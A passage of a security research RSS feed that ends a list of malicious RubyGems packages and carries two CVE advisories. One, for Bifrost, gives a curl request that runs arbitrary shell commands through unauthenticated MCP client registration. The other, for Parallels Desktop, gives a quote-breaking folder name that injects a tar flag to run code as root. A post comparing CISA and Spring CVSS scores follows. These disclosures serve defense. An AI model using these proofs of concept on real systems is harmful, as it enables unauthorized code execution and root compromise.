+| slnleaker5 | 0.0.1 | XRAY-982350 |
+| f2fe-s1 | 0.0.1 | XRAY-1024400 |
+| yardxabc889 | 0.0.1 | XRAY-982421 |
+| southpxdatapp6pi | 0.0.1 | XRAY-982441 |
+| xss-test-gem | 0.1.0 \- 0.3.5 | XRAY-1079280 |
+| test-apex-gem | 0.1.1, 0.1.3 | XRAY-1079209 |
+
+… and many more. The full list can be found [here](/gemstuffer.csv).
+
+[image1]: /img/RealTimePostImage/post/gemstuffer.png
+[image2]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image2.png
+[image3]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image3.png
+[image4]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image4.png
+[image5]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image5.png
+[image6]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image6.png
+[image7]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image7.png
+[image8]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image8.png
+[image9]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image9.png
+[image10]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image10.png
+[image11]: /img/RealTimePostImage/post/gemstuffer-openai-rubygems/image11.png]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-mcp-stdio-client-registration-cve-2026-90898/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-mcp-stdio-client-registration-cve-2026-90898/</guid>
+            <pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-90898, CRITICAL, Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Bifrost is vulnerable to Unauthenticated Remote Code Execution via MCP Stdio Client Registration
+
+
+## Component
+
+Bifrost (github.com/maximhq/bifrost/transports)
+
+## Affected versions
+
+< 2.1.0
+
+## Description
+
+Bifrost registers MCP clients through its management API. A stdio client is a command plus args. Bifrost starts that program in the gateway the moment the client is added. No MCP handshake required.
+
+The default is governance.auth_config.is_enabled=false. Auth off means every caller is a local admin. One unauthenticated POST /api/mcp/client is enough to run a program as the Bifrost process user (appuser on the official image).
+
+The HTTP request may time out. The process is already running. transports/v2.1.0 refuses an unauthenticated stdio registration with 403. transports/v2.0.0 still allows it. The 1.6.x line through 1.6.11 does not contain the fix.
+
+## PoC
+
+<br>
+
+**Step 1 - Run Bifrost with management authentication disabled**
+
+<br>
+
+Start a Bifrost HTTP transport before 2.1.0 with the default governance.auth_config.is_enabled=false. The management API must be reachable on the host and port you use below (the binary default is localhost:8080):
+
+```
+curl -fsS http://127.0.0.1:8080/health
+```
+
+<br>
+
+**Step 2 - Register a stdio MCP client**
+
+<br>
+
+No authentication header is required. A request timeout is expected while Bifrost waits for an MCP handshake. The timeout does not mean the command failed to start.
+
+```
+curl --max-time 5 --silent --show-error \
+  --request POST http://127.0.0.1:8080/api/mcp/client \
+  --header 'Content-Type: application/json' \
+  --data '{
+    "name": "rceproof",
+    "connection_type": "stdio",
+    "auth_type": "none",
+    "stdio_config": {
+      "command": "/bin/sh",
+      "args": ["-c", "echo PROVEN > /tmp/bifrost-mcp-rce; sleep 60"]
+    },
+    "tools_to_execute": ["*"]
+  }' || true
+```
+
+<br>
+
+**Step 3 - Confirm the command ran**
+
+<br>
+
+```
+cat /tmp/bifrost-mcp-rce
+```
+
+<br>
+
+Expected output:
+
+```
+PROVEN
+```
+
+<br>
+
+On 2.1.0 or later, the same POST returns 403 and the marker is not written.
+
+## Vulnerability Mitigations
+
+Upgrade Bifrost HTTP transport to 2.1.0 or later. The fix (https://github.com/maximhq/bifrost/pull/6757) returns 403 for unauthenticated stdio MCP client registration when dashboard authentication is disabled or unconfigured. Authenticated admins can still add stdio clients. The 1.6.x line through 1.6.11 and transports/v2.0.0 do not include this change.
+
+Until you upgrade, set governance.auth_config.is_enabled to true, use strong administrator credentials, and keep the management listener off untrusted networks. Treat any exposed instance that ran with authentication disabled as compromised and rotate virtual keys and provider credentials.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-90898
+https://github.com/maximhq/bifrost/pull/6757
+https://github.com/maximhq/bifrost/commit/12e170352bd25eab1ae9ba16611f1797d1fd8fdc
+https://github.com/maximhq/bifrost/releases/tag/transports/v2.1.0
+https://github.com/maximhq/bifrost
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/parallels-desktop-is-vulnerable-to-a-local-privilege-escalation-via-appliance-extract-argument-injection-cve-2026-90894/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/parallels-desktop-is-vulnerable-to-a-local-privilege-escalation-via-appliance-extract-argument-injection-cve-2026-90894/</guid>
+            <pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-90894, HIGH, Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Parallels Desktop is vulnerable to a Local Privilege Escalation via Appliance Extract Argument Injection
+
+
+## Component
+
+Parallels Desktop for Mac
+
+## Affected versions
+
+< 27.0.0
+
+## Description
+
+Parallels Desktop runs prl_disp_service as root. Local clients reach it on the world-writable socket /var/run/prl_disp_service.socket. PrlSrv_LoginLocal accepts peer credentials. No Parallels signature. No admin group.
+
+After login, PrlSrv_InstallAppliance lets you pick the appliance folder (sVmParentPath). The daemon unpacks with one string, tar -xf "%1" -C "%2", then Qt QProcess::splitCommand chops that string into words. A quote in the folder name closes early. The leftover text becomes extra tar flags. macOS tar --use-compress-program= runs the named program as root.
+
+I got a root shell on 26.4.0 (57513). 27.0.0 starts tar as a fixed argv list, so the same quote stays a folder name and does not run code. Hosts that stay on the 26.x line, including 26.4.2, do not have that extract change.
+
+## PoC
+
+<br>
+
+**Step 1 - Confirm the build and the dispatcher socket**
+
+<br>
+
+```
+defaults read "/Applications/Parallels Desktop.app/Contents/Info" CFBundleShortVersionString
+ls -l /var/run/prl_disp_service.socket
+```
+
+<br>
+
+Expected output on a vulnerable host:
+
+```
+26.4.0
+srwxrwxrwx  1 root  daemon  0 ... /var/run/prl_disp_service.socket
+```
+
+<br>
+
+**Step 2 - Log in as a non-admin user**
+
+<br>
+
+From an unsigned process, call PrlSrv_LoginLocal against the dispatcher, then read PrlUsrCfg_IsLocalAdministrator. The login returns 0. The administrator flag stays 0.
+
+<br>
+
+**Step 3 - Install an appliance into a quote-breaking folder**
+
+<br>
+
+Build a small tar and set PackageURL to a file:// path with a matching PackageMd5. Pass sVmParentPath as a real directory whose name embeds a quote and a tar flag:
+
+```
+/tmp/sprl_p_<uid>" --use-compress-program=/tmp/u<uid> "
+```
+
+<br>
+
+Call PrlSrv_InstallAppliance. On 26.4.0, QProcess::splitCommand turns the text after the quote into extra argv. macOS tar then runs /tmp/u<uid> as root.
+
+<br>
+
+**Step 4 - Check the result**
+
+<br>
+
+On 26.4.0 the named program runs as uid 0. InstallAppliance may return -41508 after extract. That is expected. Proof is the root marker, not the job status.
+
+<br>
+
+On 27.0.0 the same folder name is created on disk as a directory. It does not become tar flags. Root does not run the script.
+
+## Vulnerability Mitigations
+
+Upgrade to Parallels Desktop 27.0.0 or later.
+
+Until every host is on 27.0.0 or later, restrict local login on those Macs. Any local account on a vulnerable install can reach the dispatcher socket.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-90894
+https://kb.parallels.com/en/131168
+https://www.parallels.com/products/desktop/
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[When "Critical" Loses Context: The Reality of Spring CVEs]]></title>
+            <link>https://research.jfrog.com/post/when-critical-loses-context-spring-cves/</link>
+            <guid>https://research.jfrog.com/post/when-critical-loses-context-spring-cves/</guid>
+            <pubDate>Thu, 03 Sep 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[On August 20, 2026, Spring published 91 CVEs in a single day. CISA's ADP rated six of them Critical. When we checked those scores against Spring's own advisories, they didn't hold up.]]></description>
+            <content:encoded><![CDATA[
+![](/img/RealTimePostImage/post/when-critical-loses-context-spring-cves/image1.png)
+
+On August 20, 2026, [Spring published](https://spring.io/security) 91 CVEs in a single day. CISA's ADP rated six of them Critical. When we checked those scores against Spring's own advisories, they didn't hold up:
+
+1. ***CVE-2026-47890*** and ***CVE-2026-59313*** have the same underlying weakness: a carriage return that corrupts a Server-Sent Events stream. **Spring scores both 2.6, Low, with the same vector**. CISA scores both 9.8, Critical.
+2. ***CVE-2026-47891*** is a memory-exhaustion bug. **Nothing in the advisory or the fix touches confidentiality or integrity.** CISA's vector claims full compromise of both anyway.
+3. ***CVE-2026-47892*** and ***CVE-2026-59283*** are **reachable only under specific, non-default application conditions**. CISA assigns both Low attack complexity without accounting for these prerequisites.
+4. ***CVE-2026-47884*** is the one CVE here where CISA's Critical rating has a real basis: Spring's own advisory names a conditional path to RCE.
+
+## How CVEs Got Faster Than the People Scoring Them
+
+This is not a Spring problem, and it is not a new one. It is what happens when the volume of incoming vulnerabilities outgrows the capacity of anyone verifying them.
+
+According to NIST, CVE submissions have grown by roughly 263% since 2020. NIST enriched around 42,000 records in 2025, more than in any year before it, and still lost ground. 2026 YTD sits at 58,482 CVEs - already 45.0% above all of 2024 (40,313) and 20.9% above all of 2025 (48,364), with four months still remaining in the year. By the end of that year the NVD's backlog of unprocessed vulnerabilities had passed 27,000, and projections for 2026 put annual disclosures above 60,000. In April 2026, NIST responded the only way it could: it stopped trying to enrich everything. Today the NVD analyzes:
+
+1. CVEs in the KEV catalog.
+2. CVEs in federal software.
+3. CVEs in software defined as critical under [EO 14028](https://www.nist.gov/itl/executive-order-14028-improving-nations-cybersecurity/securing-critical-software/critical), which covers software that runs with elevated privilege or controls access to systems and data. Spring does not qualify, so its CVEs get no NIST enrichment at all.
+
+Everything else is published and labeled "Not Scheduled," These records may still contain metadata supplied by vendors or CNAs, but they receive no NIST-added severity score, CWE, or product mapping.
+
+## CVEs Rated Critical by CISA
+
+| CVE | Component | CISA score | Score from Spring CVSS vector | Spring advisory | Fix commit |
+| :---- | :---- | :---- | :---- | :---- | :---- |
+| [CVE-2026-47884](https://nvd.nist.gov/vuln/detail/CVE-2026-47884) | org.springframework:spring-webmvc | 9.8 (Critical) | 5.8 (Medium) | [Advisory](https://spring.io/security/cve-2026-47884) | [Commit](https://github.com/spring-projects/spring-framework/commit/d31f7a5a801b) |
+| [CVE-2026-47890](https://nvd.nist.gov/vuln/detail/CVE-2026-47890) | org.springframework:spring-webmvc, org.springframework:spring-webflux | 9.8 (Critical) | 2.6 (Low) | [Advisory](https://spring.io/security/cve-2026-47890) | [Commit](https://github.com/spring-projects/spring-framework/commit/1994e0ebd077) |
+| [CVE-2026-47891](https://nvd.nist.gov/vuln/detail/CVE-2026-47891) | org.springframework:spring-web | 9.8 (Critical) | 4.3 (Medium) | [Advisory](https://spring.io/security/cve-2026-47891) | [Commit](https://github.com/spring-projects/spring-framework/commit/e12f0761f3bf) |
+| [CVE-2026-47892](https://nvd.nist.gov/vuln/detail/CVE-2026-47892) | org.springframework:spring-webflux | 9.8 (Critical) | 4.8 (Medium) | [Advisory](https://spring.io/security/cve-2026-47892) | [Commit](https://github.com/spring-projects/spring-framework/commit/07cbd482a000) |
+| [CVE-2026-59313](https://nvd.nist.gov/vuln/detail/CVE-2026-59313) | org.springframework:spring-webmvc | 9.8 (Critical) | 2.6 (Low) | [Advisory](https://spring.io/security/cve-2026-59313) | [Commit](https://github.com/spring-projects/spring-framework/commit/35921cc01f81) |
+| [CVE-2026-59283](https://nvd.nist.gov/vuln/detail/CVE-2026-59283) | org.springframework:spring-expression | 9.1 (Critical) | 6.5 (Medium) | [Advisory](https://spring.io/security/cve-2026-59283) | [Commit](https://github.com/spring-projects/spring-framework/commit/0d08f8dfaf26) |
+
+\* The CISA scores come from CISA-ADP entries in NVD. Spring scores are calculated from the CVSS 3.1 vectors linked in the official Spring advisories.
+
+## Why the Gap Matters
+
+These differences highlight the value of considering vendor assessments alongside external CVSS ratings. Maintainers often have detailed knowledge of the affected code path, the conditions required for exploitation, and the likely impact, allowing their analysis to better reflect practical risk.
+
+## Why Spring's Assessments Are More Reasonable
+
+To understand the differences, we reviewed each advisory, both CVSS vectors, the affected code path, the fix, and the available tests. Spring's assessments generally reflect the conditions required to reach each issue and the impact directly supported by the code, while CISA's Critical ratings assume broader and more damaging outcomes.
+
+#### CVE-2026-47884 - Improper Path Limitation in XsltView
+
+**CISA: 9.8 Critical | Spring: 5.8 Medium**
+
+CISA rates this as full confidentiality, integrity, and availability compromise. Spring's advisory acknowledges both SSRF and RCE but scores it as low-confidentiality with changed scope - essentially rating the SSRF path. When the preconditions are met, RCE may be possible: the JDK's XSLT processor permits Java extension functions by default, and Spring does not restrict them, so an attacker-supplied stylesheet can call Runtime.exec() without any additional configuration. However, the preconditions themselves are narrow - the application must use XsltView (a legacy view technology - a public GitHub code search finds only 33 XsltViewResolver imports, versus over 8,000 for Thymeleaf and over 21,000 for JSP), have a catch-all /** mapping, and derive the view name from the request path.
+
+![](/img/RealTimePostImage/post/when-critical-loses-context-spring-cves/image2.png)
+
+Spring's 5.8 understates the impact when the conditions are met, but CISA's 9.8 overstates how commonly those conditions exist in real applications.
+
+#### CVE-2026-47890 - SSE Stream Corruption While Rendering Fragments
+
+**CISA: 9.8 Critical | Spring: 2.6 Low**
+
+CISA claims full server compromise with no preconditions. The actual bug is a `\r` character that breaks SSE field boundaries when view fragments are streamed to clients. The bug affects spring-webmvc and spring-webflux - the former among the most widely deployed Java web libraries, referenced in roughly 129,000 pom.xml files on GitHub, the latter in about 9,400 - but the vulnerable path requires the fragments-over-SSE feature.
+
+![](/img/RealTimePostImage/post/when-critical-loses-context-spring-cves/image3.png)
+
+The application must also combine this with attacker-controlled data flowing through template rendering into those fragments while victims are actively consuming the stream. The impact is corrupted event data in other users' browsers: no server-side data is leaked, no code is executed, and no service is disrupted. Spring's 2.6 accurately reflects the narrow, client-side-only impact.
+
+#### CVE-2026-47891 - maxInMemorySize Bypassed in Jaxb2XmlDecoder
+
+**CISA: 9.8 Critical | Spring: 4.3 Medium**
+
+CISA claims full confidentiality and integrity compromise. The bug is a memory-limit bypass in JAXB XML decoding that requires the optional Aalto XML async parser to be on the classpath - an uncommon dependency. The application must also actively decode XML through JAXB-annotated types, whether via @RequestBody, the functional ServerRequest API, WebClient's ClientResponse, or direct Jaxb2XmlDecoder calls. Even when all conditions are met, the impact is strictly resource exhaustion - the fix moves a byte counter, and nothing in the code path touches data confidentiality or integrity. **Of 27 Spring Framework CVEs rated Medium in 2026, CISA or NVD escalated four to Critical and seven to High. Eight kept their Medium rating, while eight have not received a separate CISA or NVD CVSS score.** Spring's availability-only score is the only one the code supports.
+
+#### CVE-2026-47892 - Header Predicate Bypass in WebFlux Functional Endpoints
+
+**CISA: 9.8 Critical | Spring: 4.8 Medium**
+
+CISA scores this as trivially exploitable with full impact. The bug only affects applications that deploy WebFlux functional endpoints standalone via RouterFunctions.toHttpHandler() or RouterFunctions.toWebHandler() - the standard Spring Boot deployment with DispatcherHandler intercepts preflight requests before any handler invocation and is not affected. This is a rare, non-default deployment pattern. The bypass causes a crafted CORS preflight to pass header predicates unconditionally and actually execute the handler function without the required headers - so if the handler returns sensitive data or triggers side effects, those fire on a crafted OPTIONS request. That said, the impact is bounded by what that specific handler does, not system-wide. Spring's 4.8 reflects that the deployment prerequisite is niche and the impact is handler-dependent; CISA's 9.8 assumes universal exploitability and full server compromise, neither of which is supported by the code.
+
+#### CVE-2026-59283 - SpEL SimpleEvaluationContext Safety Guard Bypass
+
+**CISA: 9.1 Critical | Spring: 6.5 Medium**
+
+CISA assumes low attack complexity and high integrity impact. The vulnerability is a safety guard bypass: when the SpEL compiler is active, compiled bytecode skips the runtime policy checks that SimpleEvaluationContext enforces in interpreted mode. The severity depends on whether expressions are ever compiled under a permissive context and later evaluated under a restricted one - in that scenario, the compiled bytecode retains full power. When only SimpleEvaluationContext is used, dangerous operations fail before compilation triggers, limiting impact to confidentiality leaks and memory pressure. Spring's score reflects this nuance - confidentiality low, availability high, integrity none - because assignment expressions are not compilable. The vulnerability requires two non-default configurations: explicit SimpleEvaluationContext usage and the SpEL compiler enabled in IMMEDIATE or MIXED mode, which is off by default. CISA's 9.1 treats these prerequisites as a given.
+
+#### CVE-2026-59313 - SSE Stream Corruption in Functional MVC
+
+**CISA: 9.8 Critical | Spring: 2.6 Low**
+
+Identical root cause to CVE-2026-47890 - a `\r` that breaks SSE field boundaries - but across seven specific call sites spanning three SSE builder classes in the functional MVC, annotation-based MVC, and WebFlux APIs. The vulnerability requires attacker-controlled data to reach one of these SSE builder methods. The fix replaces split("\n") with a character-by-character loop that also handles `\r`. The impact is client-side stream corruption only. Spring assigns both this and CVE-2026-47890 the identical vector and score - 2.6 Low. **Of 8 Spring Framework CVEs rated Low in 2026, CISA or NVD escalated two to Critical, two to High, and one to Medium. Only one kept its Low rating, while two have not received a separate CISA or NVD CVSS score.**
+
+## Conclusion: Two Scores, One Record, No Referee
+
+Nothing in the CVE pipeline resolves a disagreement between a vendor's score and CISA's. CISA's ADP scores only records where the CNA supplied nothing, and Vulnrichment's own documentation treats a record carrying both scores as an error in the ADP container, with the CNA's data taking precedence. Spring published complete CVSS vectors in its advisories but did not carry them into the CVE records, so the ADP filled a vacuum that was never meant to stay open.
+
+The gap that opened is not a matter of opinion. The vendor wrote the affected code, holds the report, writes the fix, and runs the tests. On CVE-2026-47891 the fix moves a byte counter; on CVE-2026-59313 it handles a carriage return, and the same weakness produces the same 9.8 twice. Nobody reading those commits arrives at full confidentiality and integrity compromise. A score assigned without them can, and did.
+
+The correction requires no new policy. Until the vendor's vector reaches the CVE record, read the ADP container as an estimate made without the code. Where a vendor score and an external one disagree, that gap is a signal to verify. **Vendor-provided vectors should remain the primary assessment, while CISA's enrichment should be reserved only for records where no vendor score exists.**
+]]></content:encoded>
+        </item>
+    </channel>
+</rss>
